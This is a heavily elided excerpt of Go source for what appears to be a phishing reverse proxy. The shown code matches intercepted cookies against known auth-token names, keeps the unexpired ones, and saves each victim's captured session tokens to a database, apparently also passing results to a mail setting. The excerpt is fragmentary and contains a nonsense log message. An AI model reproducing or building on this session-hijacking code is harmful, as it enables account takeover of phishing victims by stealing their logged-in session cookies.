					...
					if pl.isAuthToken(c_domain, ck.Name) {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
								...
								if is_auth {
									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetMailResult()); err != nil {
										log.Error("database: %v", err)
									}
									s.IsDone = true
								}
				...
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetMailResult())
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
...
func (p *HttpProxy) httpsWorker() {
	...
	for p.isRunning {
		...
		go func(c net.Conn) {
			...
			if err != nil {
				log.Warning("GAONOK COK COK COK COK")
				return
			}
